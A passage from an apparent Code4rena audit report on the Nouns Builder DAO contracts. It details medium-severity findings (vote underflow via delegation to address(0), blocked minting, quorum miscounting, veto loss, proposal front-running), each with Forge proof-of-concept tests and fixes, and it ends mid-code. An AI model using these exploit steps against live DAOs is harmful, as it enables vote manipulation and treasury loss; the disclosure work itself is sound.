PwnPatrol*\n\n[ERC721Votes.sol#L179-L190](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/token/ERC721Votes.sol#L179-L190)<br>\n\nAssuming an existing bug in the `_delegate` function is fixed (see my previous issue submission titled \"[Delegating votes leaves the token owner with votes while giving the delegate additional votes](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/198)\"):<br>\nif a user delegates to address(0) that vote gets lost.\n\n### Proof of Concept\n\nAssuming the `_delegate` function gets patched by changing:<br>\n`address prevDelegate = delegation[_from];`<br>\nto<br>\n`address prevDelegate = delegates(_from);`\n\nThe steps to be taken:\n\n1.  User (U) gets one NFT (e.g by winning the auction)\n    a. votes(U) = 1\n2.  U delegates to address(0) // prevDelegate is U, so votes(U)--\n    a. votes(U) = 0, votes(address(0)) = 0\n3.  U delegates to address(0) // prevDelegate is U, so votes(U)--\n    a. votes(U) = 2^192 - 1\n\nBelow is a forge test showing the issue:\n\n    // SPDX-License-Identifier: MIT\n    pragma solidity 0.8.15;\n\n    import { NounsBuilderTest } from \"../utils/NounsBuilderTest.sol\";\n    import { TokenTypesV1 } from \"../../src/token/types/TokenTypesV1.sol\";\n\n    contract TokenTest is NounsBuilderTest, TokenTypesV1 {\n        address user1 = address(0x1001);\n        address delegate1 = address(0x2001);\n        address delegate2 = address(0x2002);\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            vm.label(user1, \"user1\");\n            vm.label(delegate1, \"delegate1\");\n            deployMock();\n        }\n\n        function setMockFounderParams() internal virtual override {\n            address[] memory wallets = new address[](1);\n            uint256[] memory percents = new uint256[](1);\n            uint256[] memory vestingEnds = new uint256[](1);\n\n            wallets[0] = founder;\n            percents[0] = 0;\n            vestingEnds[0] = 4 weeks;\n\n            setFounderParams(wallets, percents, vestingEnds);\n        }\n\n        function test_pown2() public {\n            // user1 gets one token\n            vm.startPrank(address(auction));\n            token.mint();\n            token.transferFrom(address(auction), user1, 0);\n            vm.stopPrank();\n\n            // user1 has 1 token & 1 vote\n            assertEq(token.balanceOf(user1), 1);\n            assertEq(token.getVotes(user1), 1);\n\n            vm.prank(user1);\n            token.delegate(address(0));\n            assertEq(token.getVotes(user1), 0);\n\n            vm.prank(user1);\n            token.delegate(address(0));\n            assertEq(token.getVotes(user1), type(uint192).max);\n        }\n    }\n\n### Recommended Mitigation Steps\n\nEither:\n\n1.  Don't allow delegation to address(0) by adding a check<br>\nor<br>\n2. If someone tries to delegate to address(0), delegate to the NFT owner instead\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/203#issuecomment-1257280046):**\n > The Warden has shown how, due to incorrect accounting, the delegation of voting power to the address(0) will permanently burn that voting power.\n> \n> Because this is contingent on the owner performing the delegation, I believe Medium Severity to be more appropriate.\n\n**[tbtstl (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/203)**\n\n\n\n***\n\n## [[M-09] Index out of bounds error when properties length is more than attributes length breaks minting](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/523)\n_Submitted by dipp, also found by 0x1f8b, 0x52, 0xc0ffEE, 0xSky, bin2chen, datapunk, eierina, elad, hansfriese, hyh, izhuer, Jeiwan, Migue, R2, and scaraven_\n\n[MetadataRenderer.sol#L188-L198](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L188-L198)<br>\n\nWhen a token is minted, the `MetadataRenderer.sol` `onMinted` function is called which will set the particular token's attributes to a random item from one of the properties. A token has a maximum of 16 attributes, the first one being the total number of properties. The properties from which the token receives its attributes are supplied by the owner of the `MetadataRenderer.sol` contract by calling `addProperties`. The issue is that the number of properties the owner can supply is not limited. If the number of properties is more than 15 then the `onMinted` function will revert due to the limit on the number of attributes a token may have.\n\n### Impact\n\nSince `onMinted` is always called when tokens are minted, the DAO will not be able to mint new tokens. There does not seem to be a way to remove properties so this would be unrecoverable.\n\n### Proof of Concept\n\nTest code added to `Token.t.sol`:\n\n```solidity\n    function test_MetadataProperties() public {\n        createUsers(2, 1 ether);\n\n        address[] memory wallets = new address[](2);\n        uint256[] memory percents = new uint256[](2);\n        uint256[] memory vestExpirys = new uint256[](2);\n\n        uint256 pct = 50;\n        uint256 end = 4 weeks;\n\n        unchecked {\n            for (uint256 i; i < 2; ++i) {\n                wallets[i] = otherUsers[i];\n                percents[i] = pct;\n                vestExpirys[i] = end;\n            }\n        }\n\n        deployWithCustomFounders(wallets, percents, vestExpirys);\n\n        // Check deployed correctly\n        assertEq(token.totalFounders(), 2);\n        assertEq(token.totalFounderOwnership(), 100);\n\n        // Create 16 properties and items\n        string[] memory names = new string[](16);\n        MetadataRendererTypesV1.ItemParam[] memory items = new MetadataRendererTypesV1.ItemParam[](16);\n        for (uint256 j; j < 16; j++) {\n            names[j] = \"aaa\";                                                                               // Add random properties\n            items[j].name = \"aaa\";                                                                          // Add random items\n            items[j].propertyId = uint16(j);                                                                // Make sure all properties have items\n            items[j].isNewProperty = true;\n        }\n\n        MetadataRendererTypesV1.IPFSGroup memory group = MetadataRendererTypesV1.IPFSGroup(\n            \"aaa\",\n            \"aaa\"\n        );                                                                                                  // Add random IPFS group\n\n        // Add 16 properties\n        vm.prank(otherUsers[0]);\n        metadataRenderer.addProperties(names, items, group);\n\n        // Attempt to mint\n        vm.prank(address(auction));\n        vm.expectRevert(stdError.indexOOBError);\n        token.mint();\n    }\n```\n\nThe test code above shows that the owner of `MetadataRenderer.sol` is able to add 16 properties with 1 items each. The `auction` contract is then unable to mint due to an \"Index out of bounds\" error.\n\nCode from the `onMinted` function in `MetadataRenderer.sol`:\n\n```solidity\n            // For each property:\n            for (uint256 i = 0; i < numProperties; ++i) {\n                // Get the number of items to choose from\n                uint256 numItems = properties[i].items.length;\n\n                // Use the token's seed to select an item\n                tokenAttributes[i + 1] = uint16(seed % numItems);\n\n                // Adjust the randomness\n                seed >>= 16;\n            }\n```\n\nThe code above shows that when a token is minted and `onMinted` is called it will attempt to assign more than 16 attributes to the token which is not possible due to the `tokenAttributes` being limited to 16.\n\n### Recommended Mitigation Steps\n\nThe maximum amount of properties an owner can add should be less than the maximum amount of attributes any token can have. Consider either limiting the `properties` variable in `MetadataRenderer.sol` to 15 or allow any number of attributes to be added to a token.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/523#issuecomment-1249970597):**\n > I love that you added a coded POC.\n>\n> The Warden has shown how, due to a coding inconsistency, adding more than 15 properties will cause an Out-Of-Bounds error.\n> \n> Because this is contingent on admin configuration, I believe Medium Severity to be appropriate.\n> \n> Most direct solution is to explicitly limit the number of properties, otherwise the system could be rewritten to handle an unknown number of properties.\n\n**[iainnash (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/523)**\n\n\n\n***\n\n## [[M-10] The quorum votes calculations don't take into account burned tokens](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/423)\n*Submitted by azephiar, also found by &#95;&#95;141345&#95;&#95;, 0x52, 0xSmartContract, bin2chen, Ch\\_301, indijanc, and Tointer*\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L475><br>\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L524>\n\nBecause the following happens:\n\n1.  Burned tokens votes are effectively deleted in `token._moveDelegateVotes()` when called by `token.burn()`\n2.  When an auction gets settled without bidders the function burns the token by calling `token.burn()`\n3.  When `_createAuction()` is called an amount of tokens >= 1 is minted, of which 1 is kept in the auction contract\n4.  The functions `governor.proposalThreshold()` and `governor.quorum()` both depend on `token.totalSupply()` for their calculations.\n\nWe can derive that the protocol calculates the `quorumVotes` taking into account burned tokens and tokens held in the auction contract, which don't have any actual voting power. In other words the actual `quorumThresholdBps` is equal or higher than the setted `quorumThresholdBps`.\n\n### Impact\n\nThe worse case scenario that can happen is that the quorum gets so high that a proposal cannot pass even if everybody voted and everybody voted `for`, potentially locking funds into the contract.\n\nWe can define:\n\n1.  `assumedVotingPower` = `token.totalSupply()`\n2.  `realVotingPower` = `token.totalSupply() - amountOfTokensBurned`\n3.  `ΔVotingPower` = `amountOfTokensBurned`\n\nThis is the case if:\n\n    realVotingPower at proposal.voteEnd < quorum at proposal.timeCreated\n\nwhich is the same as\n\n    realVotingPower < (assumedVotingPower * settings.quorumThresholdBps) / 10_000\n\nand rearranging in terms of `settings.quorumThresholdBps` we have:\n\n    settings.quorumThresholdBps > 10_000 * realVotingPower/assumedVotingPower\n\nKnowing that:\n\n1.  The possible range of values for `10_000 * realVotingPower/assumedVotingPower` is from `1` to `10000`. If `realVotingPower = 0` this model doesn't make sense in the first place.\n\n2.  The possible range of values of `settings.quorumThresholdBps` is from `1` to `2^16 - 1`. The protocol allows for `settings.quorumThresholdBps` to be `0`, in which case it means that the actual quorum is `0`; a context in which this model doesn't make sense. There's another catch that restricts this boundaries, if `settings.quorumThresholdBps * token.totalSupply()` < `10_000` the output of `governance.quorum()` would be `0`.\n\nMany combinations of values in the ranges described above render this disequation true, note, however, that this describes the workings in a mathematical settings and it doesnt hold true for every case in a real setting because of roundings and approximations.\n\nWe can intuitevely notice that when `realVotingPower/assumedVotingPower` is very low, which is the case of a DAO with few tokens burned, the chances of the disequation being true are slim and when it's high the chances of the disequation being true become higher. The opposite is true for `settings.quorumThresholdBps`.\n\nThis might lock funds in DAOs with a lot of unsold auctions who have a low `settings.quorumThresholdBps`.\n\nAt early stages this is mitigated by the fact that for every possible token burned some tokens are minted to the founders, but when the vest expires this mitigation is not in place anymore.\n\n### Proof of Concept\n\nI wrote a test that's expected to revert a `proposal.queue()` even if all possible votes available are cast in favor.\n\nThe test comes with two parameters to set: `auctionsToRun` and `tokensToBidder`. The test runs `auctionsToRun` auctions, of which the first `tokensToBidder` are bidded upon and the rest are not. Then:\n\n1.  Creates a proposal\n2.  Cast all possible votes in favor\n3.  Tries to queue a proposal\n4.  Reverts\n\nThe default parameters are set to `auctionsToRun = 130` and `tokensToBidder = 10`. Also `quorumThresholdBps = 1000`. This test results in `121 tokens burned` and `133 token minted`. It's quite an unrealistic scenario, but it can get more real if `quorumThresholdBps` is setted lower. Keep in mind that this is the case in which everybody shows up to vote and averybody votes for.\n\n#### Test code\n\nThe test can be pasted inside `Gov.t.sol` and then run with:\n\n`test -m test_RevertQueueProposalWithEverybodyInFavour`\n\n```javascript\nfunction test_RevertQueueProposalWithEverybodyInFavour() public {\n    //Number of auctions to run\n    uint256 auctionsToRun = 130;\n\n    //Amount of tokens to bid up\n    uint256 tokensToBidder = 10;\n\n    address bidder1 = vm.addr(0xB1);\n    vm.deal(founder, 10000 ether);\n    vm.deal(bidder1, 10000 ether);\n\n    //Start the first auction\n    vm.prank(founder);\n    auction.unpause();\n\n    //Simulates an `auctionsToRun` amount of auctions in which the first `tokensForBidder` tokens\n    //are minted and then every auction ends with no bidders.\n    uint256 amountOfBurnedTokens;\n    for (uint256 i = 1; i < auctionsToRun + 1; ++i) {\n        if (i < tokensToBidder) {\n            uint256 id = token.totalSupply() - 1;\n            vm.prank(bidder1);\n            auction.createBid{ value: 0.15 ether }(id);\n        } else {\n            amountOfBurnedTokens++;\n        }\n\n        vm.warp(block.timestamp + auction.duration() + 1);\n        auction.settleCurrentAndCreateNewAuction();\n    }\n\n    uint256 founderVotes = token.getVotes(founder);\n    uint256 founder2Votes = token.getVotes(founder2);\n    uint256 bidder1Votes = token.getVotes(bidder1);\n    uint256 auctionVotes = token.getVotes(address(auction));\n\n    uint256 realVotingPower = founderVotes + founder2Votes + bidder1Votes;\n    uint256 assumedVotingPower = token.totalSupply();\n\n    assertEq(realVotingPower, assumedVotingPower - amountOfBurnedTokens - auctionVotes);\n\n    //Create mock proposal\n    (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = mockProposal();\n    vm.prank(bidder1);\n    bytes32 proposalId = governor.propose(targets, values, calldatas, \"\");\n\n    emit log_string(\"Amount of tokens minted: \");\n    emit log_uint(token.totalSupply());\n\n    emit log_string(\"Amount of tokens burned:\");\n    emit log_uint(amountOfBurnedTokens);\n\n    emit log_string(\"---------\");\n\n    emit log_string(\"The real quorumThresholdBps is: \");\n    uint256 realquorumThresholdBps = (governor.getProposal(proposalId).quorumVotes * 10_000) / realVotingPower;\n    emit log_uint(realquorumThresholdBps);\n\n    emit log_string(\"The assumed quorumThresholdBps is:\");\n    uint256 assumedquorumThresholdBps = (governor.getProposal(proposalId).quorumVotes * 10_000) / token.totalSupply();\n    emit log_uint(assumedquorumThresholdBps);\n\n    emit log_string(\"---------\");\n\n    vm.warp(governor.getProposal(proposalId).voteStart);\n\n    //Everybody cast a `for` vote\n    vm.prank(founder);\n    governor.castVote(proposalId, 1);\n\n    vm.prank(founder2);\n    governor.castVote(proposalId, 1);\n\n    vm.prank(bidder1);\n    governor.castVote(proposalId, 1);\n\n    emit log_string(\"The amount of votes necessary for this proposal to pass is:\");\n    emit log_uint(governor.getProposal(proposalId).quorumVotes);\n\n    emit log_string(\"The amount of for votes in the proposal:\");\n    emit log_uint(governor.getProposal(proposalId).forVotes);\n\n    //Proposal still doesn't pass\n    vm.warp((governor.getProposal(proposalId).voteEnd));\n    vm.expectRevert(abi.encodeWithSignature(\"PROPOSAL_UNSUCCESSFUL()\"));\n    governor.queue(proposalId);\n}\n```\n\n### Tools Used\n\nForge\n\n### Recommended Mitigation Steps\n\nEither one of this 2 options is viable:\n\n1.  Decrease `token.totalSupply()` whenever a token gets burned. This might not be expected behaviour from the point of view of external protocols.\n2.  Adjust the calculations in `proposal.quorum()` and `governor.proposalThreshold()` in such a way that they take into account the burned tokens and the tokens currently held by the auction contract.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/423#issuecomment-1257290133):**\n > The system is using totalSupply as a way to determine quorum.\n> \n> Because the system is adapted to not look at totalSupply at a certain block, I assume the Sponsor removed the code to reduce totalSupply.\n> \n> However this can cause issues, such as the inability to reach quorum, or quorum being too high compared to circulatingSupply.\n> \n> I believe that mitigation for this issue is not straightforward, as to allow dynamic totalSupply changes, checkpoints for total supply should be brought back as well.\n> \n> From checking NounsDAO code, they handle this by using a list for the totalSupply and popping an entry out of it:\n> https://etherscan.io/address/0x9c8ff314c9bc7f6e59a9d9225fb22946427edc03#code#F11#L183\n> \n> Meaning that totalSupply does change in what is the reference implementation for this codebase.\n> \n> Given the above, I believe the finding to be valid and of Medium Severity.\n\n**[iainnash (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/423)**\n\n\n\n***\n\n## [[M-11] Loss of Veto Power can Lead to 51% Attack](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/533)\n_Submitted by TomJ, also found by 0xSky, ayeslick, Chom, pedr02b2, PwnPatrol, yixxas, and zkhorse_\n\n[Governor.sol#L76](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L76)<br>\n[Governor.sol#L596-L602](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L596-L602)<br>\n\nThe veto power is important functionality for current Nouns DAO logic in order to protect their treasury from malicious proposals.\nHowever there is lack of zero address check and lack of 2 step address changing process for vetoer address.<br>\nThis might lead to DAO owner losing their veto power unintentionally and open to 51% attack which can drain their entire treasury.\n\n<https://dialectic.ch/editorial/nouns-governance-attack><br>\n<https://dialectic.ch/editorial/nouns-governance-attack-2>\n\n### Proof of Concept\n\nLack of 0-address check for vetoer address at initialize() of Governor.sol<br>\nAlso I recommend to make changing address process of vetoer at updateVetoer() into 2-step process to avoid accidently setting\nvetoer to arbitrary address and end up lossing veto power unintentionally.\n\n    Governor.sol:\n    57:    function initialize(\n             ...\n    76:        settings.vetoer = _vetoer;\n\n<!---->\n\n    596:    function updateVetoer(address _newVetoer) external onlyOwner {\n    597:        if (_newVetoer == address(0)) revert ADDRESS_ZERO();\n    599:        emit VetoerUpdated(settings.vetoer, _newVetoer);\n    601:        settings.vetoer = _newVetoer;\n    602:    }\n\n### Recommended Mitigation Steps\n\nAdd zero address check for vetoer address at initialize().<br>\nChange updateVetoer() vetoer address changing process to 2-step process like explained below.\n\nFirst make the updateVetoer() function approve a new vetoer address as a pending vetoer.<br>\nNext that pending vetoer has to claim the ownership in a separate transaction to be a new vetoer.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/533#issuecomment-1257297522):**\n > Given the informations that we have, the settings that are available and the [historical context](https://dialectic.ch/editorial/nouns-governance-attack-2), considering that the contract can allow burning the Vetoer, the Warden has demonstrated a risk that applies to all DAOs built via the factory, as well as other Governance Processes which share those traits.\n> \n> Because this exploit is contingent on external factors, I think Medium Severity to be appropriate.\n>\n> I personally believe that a Vetoer is a challenge toward a decentralized governance process, however I must agree with the evidence that a 51% attack is possible and has been exploited in the past via code similar to that which is in scope.\n\n**[tbtstl (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/533)**\n\n**[kulkarohan (Nouns Builder) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/533#issuecomment-1261738906):**\n > The zero-address check is done in `Manager.deploy()` -- see the following lines:\n> \n> [Manager.sol#L117](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L117)\n> \n> [Manager.sol#L139](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L139)\n> \n> I agree however that the vetoer should be set in 2-steps instead of directly.\n\n**[kulkarohan (Nouns Builder) disagreed with severity and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/533#issuecomment-1265987401):**\n > Believe this is QA IMO.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/533#issuecomment-1272568232):**\n > Agree with the sponsor that 2 step checks are QA.\n> \n> However, am choosing to keep the report as Med for the 51% attack part.\n> \n> Historically this has been exploited and can create a dramatic impact.\n> \n> My specific reasoning is that a 51% attack can happen, exclusively if Vetoer is removed, apathetic or malicious.\n> \n> This guiding principle has opened up, for this specific contest, a set of decision that inherently create some attrition between me and the sponsor, specifically: this report, as well as [#479](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/479) and [#622](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/622).\n> \n> My reasoning is that all of these findings are logically equivalent.\n> \n> - There's a risk of brute forcing the system\n> - To avoid the brute force we have a trusted third party\n> - The trusted third party creates a new set of complications\n> \n> I can only empathize with the Sponsor in that the system does what it's supposed to do, which is being a factory of Nouns DAO, at the same time, because of our rules, and the historical context of previous judging, Admin Privilege is a valid Medium Severity finding (as highlighted by other reports in this same contest and others).\n> \n> Unfortunately Admin privilege in the case of governance falls onto the Vetoer, the one entity that is necessary to avoid a riskier (potentially) situation of a 51% attack. 51% voting power can be reached by bribing any time it's economically feasible.\n> \n> It is indeed circular logic, which to me reflects the current state of onChain governance. Which means I don't have a clear mitigation.\n> \n> For those reasons I can agree to disagree with the Sponsor and also recommend a nofix as at this time, with the given architecture, we either have a risk of Malicious Governance, Bribeable Voters, or risk of Malicious Vetoer.\n> \n> When we talk about \"Smart Contract\" risk today, we can talk about Qualitative Risks and Quantitative Risks, the idea that a Vetoer could be malicious seems to fall into a Qualitative Risk, due to the bleeding-edge state of the tech and industry, I believe every person using the system is aware of those risks, however the acknowledgement of those risks doesn't make it disappear.\n> \n> This report and the two linked below also show a limitation of our current rules as well as the need to clarify what is \"acceptable\" Admin Privilege vs what is not.\n> \n> Because of the context detailed above, I believe that I must judge those 3 findings equivalently, and while an argument for downgrading them to QA is legitimate, I believe that the correct severity, consistent over the organization's lifetime (over 1 year and a half) is Medium Severity.\n> \n> I understand other Auditors and projects offer a different rating (see Consensys Medium for Flagging staff up, vs our Medium which means Loss of Funds Conditional on External Conditions)\n> \n> And I believe these findings will have to be discussed within the org to decide if Medium severity is appropriate.<br>\n> I'll be flagging these findings up to discuss them with the broader community and discuss whether it is correct or appropriate for C4 to judge findings that ultimately \"protect the end user\" while they create attrition with the Sponsor.\n> \n> While we have those discussions, at this time, C4 has prided itself in calling out unspoken risks that are inherent with a specific system (Smart Contract Risk), and in the case of the governor, as detailed by this report, [#479](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/479) and [#622](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/622) there's an inherent risk which we made our best effort to quantify, and hopefully in talking about instead of taking it for granted, as a industry, we can find a way to build software that addresses these concerns.\n\n\n\n***\n\n## [[M-12] Try-catch block at `Auction._createAuction()` will only catch string errors](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/240)\n_Submitted by 0xA5DF_\n\n[Auction.sol#L234](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L234)<br>\n\nThe `_createAuction` function wraps the `token.mint()` call in a try-catch block, however this will only catch reverts that comes from the require keyword and not the reverts with custom errors or other kinds of errors (arithmetic over/underflow etc.)\n\n### Impact\n\nIn case of an error at the `mint()` function the auction won't be settled till the owner intervenes and pauses the contract.\n\n### Proof of Concept\n\nHere's a test that proves that `catch Error()` doesn't catch custom errors (the test will fail):\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\n\ncontract ContractTest is Test {\n    function testErr() public{\n        Reverter r = new Reverter();\n        try r.throwCustomError(){\n\n        }catch Error(string memory) {\n\n        }\n    }\n}\n\ncontract Reverter{\n    error  MyErr();\n\n    function throwCustomError() public{\n        revert MyErr();\n    }\n}\n\n\n```\n\n### Recommended Mitigation Steps\n\nRemove the `Error` so that it'll catch any kind of revert:\n\n```diff\n             // Pause the contract if token minting failed\n-        } catch Error(string memory) {\n+        } catch  {\n             _pause();\n         }\n     }\n```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/240#issuecomment-1253769910):**\n > Any revert caused by minting will not be captured.\n> \n> This means that in the case of a erroneous mint the contract will be effectively bricked (and not paused).\n> \n> I have considered higher severity, but in lack of clear conditions for revert, I think Medium is appropriate.\n\n**[iainnash (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/240)**\n\n\n\n***\n\n## [[M-13] Compromised or malicious vetoer can veto any proposals with unrestricted power](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/622)\n_Submitted by rbserver, also found by ayeslick and rvierdiiev_\n\nThe `settings.vetoer`, which is the first founder defined by the `FounderParams`, can call the following `veto` function to veto any proposals that are not yet executed, which immediately blocks these proposals from execution. Because the vetoer is just one founder, which can just be a single EOA, the chance of losing its private key and being compromised is not low. There is also no guarantee that the vetoer will not become malicious in the future. When the vetoer becomes compromised or malicious, all critical proposals, such as for updating implementations or withdrawing funds from the treasury, can be vetoed so the negative impact can be very high.\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L385-L405>\n\n```solidity\n    function veto(bytes32 _proposalId) external {\n        // Ensure the caller is the vetoer\n        if (msg.sender != settings.vetoer) revert ONLY_VETOER();\n\n        // Ensure the proposal has not been executed\n        if (state(_proposalId) == ProposalState.Executed) revert PROPOSAL_ALREADY_EXECUTED();\n\n        // Get the pointer to the proposal\n        Proposal storage proposal = proposals[_proposalId];\n\n        // Update the proposal as vetoed\n        proposal.vetoed = true;\n\n        // If the proposal was queued:\n        if (settings.treasury.isQueued(_proposalId)) {\n            // Cancel the proposal\n            settings.treasury.cancel(_proposalId);\n        }\n\n        emit ProposalVetoed(_proposalId);\n    }\n```\n\n### Proof of Concept\n\nPlease append the following tests in `test\\Gov.t.sol`. These tests will pass to demonstrate the vetoer's power for vetoing pending, active, and queued proposals.\n\n```solidity\n    function test_VetoPendingProposal() public {\n        bytes32 proposalId = createProposal();\n\n        assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Pending));\n\n        // vetoer can veto a pending proposal without a delay\n        vm.prank(founder);\n        governor.veto(proposalId);\n        assertEq(uint8(governor.state(proposalId)), uint8(ProposalState.Vetoed));\n    }\n```\n\n```solidity\n    function test_VetoActiveProposal() public {\n        mintVoter1();\n\n        bytes32 proposalId = createProposal();\n\n        uint256 votingDelay = governor.votingDelay();\n        vm.warp(block.timestamp + votingDelay + 1);\n\n        assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Active));\n\n        // vetoer can veto an active proposal without a delay\n        vm.prank(founder);\n        governor.veto(proposalId);\n        assertEq(uint8(governor.state(proposalId)), uint8(ProposalState.Vetoed));\n    }\n```\n\n```solidity\n    function test_VetoQueuedProposal() public {\n        mintVoter1();\n\n        bytes32 proposalId = createProposal();\n\n        vm.warp(block.timestamp + governor.votingDelay());\n\n        assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Active));\n\n        vm.prank(voter1);\n        governor.castVote(proposalId, 1);\n\n        vm.warp(block.timestamp + governor.votingPeriod());\n\n        assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Succeeded));\n\n        vm.prank(voter1);\n        governor.queue(proposalId);\n\n        assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Queued));\n\n        // vetoer can veto a queued proposal without a delay\n        vm.prank(founder);\n        governor.veto(proposalId);\n        assertEq(uint8(governor.state(proposalId)), uint8(ProposalState.Vetoed));\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nA token supply threshold governance configuration can be added. Before the token supply exceeds this threshold, the vetoer can remain in full power for protecting against the 51% attack on the deployed DAO while the token supply is low.\n\nAfter the token supply exceeds this threshold, the following changes can be considered for restricting the vetoer's power.\n\n1.  The vetoer is only allowed to veto a proposal during a defined period after the voting is done. The proposal is not allowed to be executed during this period.\n2.  The vetoer is only allowed to veto the passed proposal when the number of support and against votes are very close or the number of support votes is much higher than the against votes.\n\n**[tbtstl (Nouns Builder) disputed and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/622#issuecomment-1258591799):**\n > The intention of the vetoer is to ensure they can veto. This is by design.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/622#issuecomment-1258871521):**\n > I believe that in the spirit of transparency, because the 51% without Vetoer is a valid attack, then the idea the Vetoer can be the weak link also has to be entertained.\n> \n> While we would all agree that there are ways to mitigate this, such as using a fairly strong multisig with members of other projects, we would also agree concede that the Vetoer would still be the last piece before decentralization.\n> \n> In that sense, an early project does carry further risk because of the Vetoer, and while a Vetoer itself is not inherently good nor bad, the Vetoer itself could create opportunities for sophisticated attacks.\n> \n> Other reports spoke about bribing voters, or pure 51% attacks, and all of these are contingent on the Vetoer being unable to react / defend the protocol at the right time.\n> \n> So, if we agree that the lack of Vetoer is a vulnerability we must also agree that the presence of a tyrannical Vetoer is a vulnerability as well.\n> \n> In that sense we must admit that Governance itself can create further problems and risks and perhaps issuing enough tokens to allow the burning of the Vetoer is the first step towards a more decentralized Project.\n\n**[tbtstl (Nouns Builder) acknowledged](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/622)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/622#issuecomment-1265693365):**\n > Because Code4rena is a user facing Project, where our reports can be used to persuade end-users that the protocols are safe, per the logic detailed above, the finding is valid and of Medium Severity per our rules.\n\n\n\n***\n\n## [[M-14] Creating a new governance proposal can be prevented by anyone](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/182)\n_Submitted by berndartmueller, also found by CertoraInc, m9800, and scaraven_\n\nWhen creating a new governance proposal, the `proposalId` is generated by hashing the proposal data (`_targets, _values, _calldatas, descriptionHash`). To prevent duplicated proposals, the current `Governor` implementation checks if the `proposalId` exists already. If it exists, the call will revert with the `PROPOSAL_EXISTS` error.\n\n### Impact\n\nAnyone can prevent others from creating governance proposals by front-running the create proposal transaction with the same data, followed by an immediate call to the `Governor.cancel` function.\n\nThis will prevent creating a proposal with the same proposal data. A proposal creator would have to slightly change the proposal to try to create it again (however, it can be prevented again due to the aforementioned issue).\n\n### Proof of Concept\n\n[governance/governor/Governor.propose](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L151)\n\n```solidity\nfunction propose(\n    address[] memory _targets,\n    uint256[] memory _values,\n    bytes[] memory _calldatas,\n    string memory _description\n) external returns (bytes32) {\n    [..]\n\n    // Compute the description hash\n    bytes32 descriptionHash = keccak256(bytes(_description));\n\n    // Compute the proposal id\n    bytes32 proposalId = hashProposal(_targets, _values, _calldatas, descriptionHash);\n\n    // Get the pointer to store the proposal\n    Proposal storage proposal = proposals[proposalId];\n\n    // Ensure the proposal doesn't already exist\n    if (proposal.voteStart != 0) revert PROPOSAL_EXISTS(proposalId); // @audit-info Reverts in case the proposals with the same data exists already\n\n    [..]\n}\n```\n\n[governance/governor/Governor.cancel](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L353-L377)\n\nCancelling a proposal updates the `proposal.canceled` boolean property to `true`. `proposal.voteStart` is left unchanged (`!= 0`).\n\n```solidity\n/// @notice Cancels a proposal\n/// @param _proposalId The proposal id\nfunction cancel(bytes32 _proposalId) external {\n    // Ensure the proposal hasn't been 